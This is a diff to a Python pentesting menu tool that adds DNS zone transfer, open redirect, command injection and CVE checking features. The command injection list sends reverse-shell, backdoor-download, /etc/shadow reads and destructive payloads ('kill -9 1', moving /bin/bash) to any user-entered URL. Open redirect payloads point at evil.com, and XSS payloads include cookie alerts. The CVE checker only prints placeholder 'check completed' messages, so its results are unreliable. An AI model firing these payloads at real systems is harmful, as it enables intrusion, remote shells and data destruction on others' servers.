@@ -4,6 +4,9 @@ import socket
 import ssl
 from urllib.parse import urljoin, urlparse
 import os
+import dns.resolver
+import dns.query
+import dns.zone
 from concurrent.futures import ThreadPoolExecutor
 
 os.makedirs("output", exist_ok=True)
@@ -18,26 +21,30 @@ def display_banner():
  ## ##    ##   #    ###    ### ###    ###     ##   #   ## ##   
 #####    #######    ###     #####     ###    #######  #### ##   V4.3
 
- \033[1;32m+ -- -- +=[ Author: kdandy | Repo: https://github.com/kdandy/devtools\033[1;m
- \033[1;32m+ -- -- +=[ Basic Pentesting Tools \033[1;m
+ \033[1;32m Author: kdandy | Repo: https://github.com/kdandy/devtools\033[1;m
+ \033[1;32m Basic Pentesting Tools \033[1;m
     """)
 
 def display_menu():
-    print("\nSelect the features you want to run:")
-    print("1. Search for subdomains")
-    print("2. Spam GET requests to target URL")
-    print("3. Full Port Scan")
-    print("4. Directory and Sensitive File Bruteforcing")
-    print("5. SQL Injection Testing")
-    print("6. XSS Testing")
-    print("7. Header and SSL/TLS Inspection")
-    print("8. CSRF Testing")
-    print("9. Exit")
-    choice = input("Enter options (1-9): ")
+    print("\n\033[1;32mSelect the features you want to run:\033[1;m")
+    print("\033[1;32m1.\033[1;m Search for subdomains")
+    print("\033[1;32m2.\033[1;m Spam GET requests to target URL")
+    print("\033[1;32m3.\033[1;m Full Port Scan")
+    print("\033[1;32m4.\033[1;m Directory and Sensitive File Bruteforcing")
+    print("\033[1;32m5.\033[1;m SQL Injection Testing")
+    print("\033[1;32m6.\033[1;m XSS Testing")
+    print("\033[1;32m7.\033[1;m Header and SSL/TLS Inspection")
+    print("\033[1;32m8.\033[1;m CSRF Testing")
+    print("\033[1;32m9.\033[1;m Reverse DNS Lookup")
+    print("\033[1;32m10.\033[1;m DNS Zone Transfer Testing")
+    print("\033[1;32m11.\033[1;m Open Redirect Testing")
+    print("\033[1;32m12.\033[1;m Command Injection Testing")
+    print("\033[1;32m13.\033[1;m CVE Exploit Checker")
+    print("\033[1;32m14.\033[1;m Exit")
+    choice = input("\033[1;32mEnter options (1-14): \033[1;m")
     return choice
 
 def url_validator(url):
-    """Validate if URL has a correct scheme."""
     parsed = urlparse(url)
     return parsed.scheme in ('http', 'https')
 
@@ -219,16 +226,11 @@ async def xss_testing(url):
         return
 
     xss_payloads = [
-    # Basic XSS Payloads
     "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
     "<body onload=alert('XSS')>", "'\"><img src=x onerror=alert('XSS')>",
-
-    # Script Injection Variants
     "<script>alert(document.cookie)</script>", "<script>alert('XSS');</script>",
     "<svg onload=alert('XSS')>", "<iframe src=javascript:alert('XSS')>",
     "<video><source onerror=\"javascript:alert('XSS')\">", "<input onfocus=alert('XSS') autofocus>",
-
-    # Event Handler Injection
     "<img src=x onerror=alert('XSS') />", "<img src=x onerror=\"alert('XSS')\" />",
     "<a href='javascript:alert(1)'>Click</a>", "<button onclick=alert('XSS')>Click</button>",
     "<div onmouseover=alert('XSS')>Hover over me!</div>", "<input onblur=alert('XSS')>",
@@ -332,6 +334,111 @@ async def csrf_testing(url):
             except Exception as e:
                 print(f"Error testing CSRF payload {payload}: {e}")
 
+async def reverse_dns_lookup(ip):
+    print(f"Starting reverse DNS lookup for {ip}")
+    try:
+        hostnames = socket.gethostbyaddr(ip)
+        print(f"Hostnames associated with {ip}: {hostnames}")
+    except Exception as e:
+        print(f"Error in reverse DNS lookup for {ip}: {e}")
+
+async def dns_zone_transfer(domain):
+    print(f"Attempting DNS zone transfer for {domain}")
+    try:
+        ns_records = dns.resolver.resolve(domain, 'NS')
+        for ns in ns_records:
+            ns = str(ns).strip('.')
+            try:
+                zone = dns.query.xfr(ns, domain)
+                z = dns.zone.from_xfr(zone)
+                print(f"Zone Transfer succeeded for {domain} using NS {ns}")
+                for name, node in z.nodes.items():
+                    print(f"Found DNS entry: {name}")
+                return
+            except Exception as e:
+                print(f"Failed zone transfer for NS {ns}: {e}")
+    except Exception as e:
+        print(f"DNS zone transfer attempt failed: {e}")
+
+async def open_redirect_testing(url):
+    print(f"Starting Open Redirect testing on {url}")
+    payloads = [
+    "/redirect?url=http://evil.com", "/out?link=http://evil.com",
+    "/go?to=http://evil.com", "/forward?target=http://evil.com",
+    "/next?u=http://evil.com", "/?return=http://evil.com",
+    "/click?redirect=http://evil.com", "/image?url=http://evil.com",
+    "/login?continue=http://evil.com", "/auth?redir=http://evil.com",
+    "/validate?url=http://evil.com", "/view?src=http://evil.com",
+    "/outbound?dest=http://evil.com", "/forwarding?to=http://evil.com",
+    "/jump?destination=http://evil.com", "/link?next=http://evil.com",
+    "/track?go=http://evil.com", "/site?visit=http://evil.com",
+    "/load?uri=http://evil.com", "/transfer?url=http://evil.com",
+    "/action?redirect_uri=http://evil.com", "/confirm?url=http://evil.com",
+    "/api?ref=http://evil.com", "/portal?url=http://evil.com",
+    "/redir?path=http://evil.com"
+    ]
+    
+    async with aiohttp.ClientSession() as session:
+        for payload in payloads:
+            test_url = urljoin(url, payload)
+            try:
+                async with session.get(test_url, allow_redirects=True) as response:
+                    if "evil.com" in str(response.url):
+                        print(f"Potential Open Redirect found: {test_url} redirected to {response.url}")
+            except Exception as e:
+                print(f"Error testing Open Redirect payload {payload}: {e}")
+
+async def command_injection_testing(url):
+    print(f"Starting Command Injection testing on {url}")
+    payloads = [
+    "; ls", "| whoami", "&& uname -a", "`id`", "$(cat /etc/passwd)",
+    "| nc -e /bin/bash 10.10.10.10 4444", "&& curl http://evil.com",
+    "`nc -nv 192.168.1.1 4444`", "$(wget http://malicious-site.com)",
+    "| sleep 10", "; cat /etc/shadow", "&& touch /tmp/pwned",
+    "| ping -c 10 192.168.1.1", "; curl -o /tmp/backdoor http://evil.com/backdoor",
+    "| echo hacked > /tmp/hacked.txt", "`/bin/sh -i`", "| ps aux", "; kill -9 1",
+    "`curl http://attack-server`", "| echo Exploited > /var/tmp/pwned",
+    "&& mv /bin/bash /bin/shadow-backup", "`echo owned`", "| tee /etc/issue"
+    ]
+    async with aiohttp.ClientSession() as session:
+        for payload in payloads:
+            test_url = f"{url}{payload}"
+            try:
+                async with session.get(test_url) as response:
+                    print(f"Tested payload: {payload}, Status: {response.status}")
+                    content = await response.text()
+                    if "root" in content or "uid=" in content:
+                        print(f"Potential Command Injection vulnerability with payload: {payload}")
+            except Exception as e:
+                print(f"Error testing payload {payload}: {e}")
+
+async def cve_exploit_checker(domain):
+    print(f"Checking CVEs for {domain}")
+    cve_list = [
+    "CVE-2021-44228",
+    "CVE-2022-22965",
+    "CVE-2017-5638",
+    "CVE-2018-7600",
+    "CVE-2019-19781",
+    "CVE-2019-0708",
+    "CVE-2020-1472",
+    "CVE-2018-11776",
+    "CVE-2021-34527",
+    "CVE-2018-13379",
+    "CVE-2020-0796",
+    "CVE-2019-11510",
+    "CVE-2017-11882",
+    "CVE-2020-5902",
+    "CVE-2019-18935",
+    "CVE-2018-1002105",
+    "CVE-2022-1388",
+    ]
+
+    for cve in cve_list:
+        print(f"Checking {cve}...")
+        # Simulate a check; integrate CVE vulnerability databases or APIs here
+        print(f"{cve} check completed. (Implement real checks as needed)")
+
 async def main():
     display_banner()
     while True:
@@ -365,6 +472,21 @@ async def main():
             url = input("Enter the target URL for CSRF testing (e.g., https://example.com/login): ")
             await csrf_testing(url)
         elif choice == "9":
+            ip = input("Enter the IP address for reverse DNS lookup: ")
+            await reverse_dns_lookup(ip)
+        elif choice == "10":
+            domain = input("Enter the domain for DNS zone transfer testing: ")
+            await dns_zone_transfer(domain)
+        elif choice == "11":
+            url = input("Enter the URL for Open Redirect testing (e.g., https://example.com): ")
+            await open_redirect_testing(url)
+        elif choice == "12":
+            url = input("Enter the URL for Command Injection testing (e.g., https://example.com): ")
+            await command_injection_testing(url)
+        elif choice == "13":
+            domain = input("Enter the domain for CVE exploit checking (e.g., example.com): ")
+            await cve_exploit_checker(domain)
+        elif choice == "14":
             print("Exiting...")
             break
         else:
